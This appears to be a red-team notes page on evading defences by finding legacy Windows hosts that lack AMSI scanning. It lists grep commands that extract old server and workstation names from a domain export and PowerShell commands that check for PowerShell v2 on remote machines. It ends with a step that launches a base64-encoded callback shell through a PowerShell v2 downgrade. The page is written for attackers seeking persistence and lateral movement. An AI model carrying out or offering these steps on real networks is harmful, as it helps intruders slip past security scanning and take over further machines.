# Description

The best defense evasion which is the most efficient way is to find legacy operating systems to lay a low profile in the network traffic to establish persistence to maintain access. Especially these legacy systems do not contain up-to-date security solutions. The main benefit is it is not required to re-implement the implant. It is easier to laterally pivot the machines with little effort.

## 01 - Lack of AMSI Scanner

### 1.1 - Windows Servers

- Windows Server 2003

`$ grep 'Windows Server 2003' domain-network.csv | grep -oP '^:"CN=.*?,' > windows-servers-2003-output.txt`

- Windows Server 2008 R2

`$ grep 'Windows Server 2008' domain-network.csv | grep -oP '^:"CN=.*?,' > windows-servers-2008-output.txt`

- Windows Server 2012

`$ grep 'Windows Server 2012' domain-network.csv | grep -oP '^:"CN=.*?,' > windows-servers-2012-output.txt`

### 1.2 - Windows Workstations

- Windows XP

`$ grep 'Windows XP' domain-network.csv | grep -oP '^:"CN=.*?,' > windows-xp-output.txt`

- Windows 7

`$ grep 'Windows 7' domain-network.csv | grep -oP '^:"CN=.*?,' > windows-7-output.txt`

## 02 - Downgrade Powershell

### 2.1 - Enumerate Powershell Version 2

```
PS C:\> $PSVersionTable

PS C:\> Get-WindowsFeature PowerShell-V2

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { Get-WindowsFeature PowerShell-V2 }

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { $PSVersionTable }
```

### 2.2 - Execute Callback Shell

```
PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { powershell -version 2 -e <base64_payload> }
```

---
## References

- [[Tactics && Techniques && Procedures (TTPs) Phases/F - Post Exploitation/Shell Is The Beginning/02 - Enumeration and Discovery/Windows/Active Directory/Internal Reconnaissance/02 - Domain Controller/DC/Manual/Living off the Land|Living off the Land: Domain Controller]]

- [[Tactics && Techniques && Procedures (TTPs) Phases/F - Post Exploitation/Shell Is The Beginning/02 - Enumeration and Discovery/Windows/Active Directory/Networking/01 - IP Address/Offensive Tools/Scripts/PowerSploit|PowerSploit: Active Directory Networking]]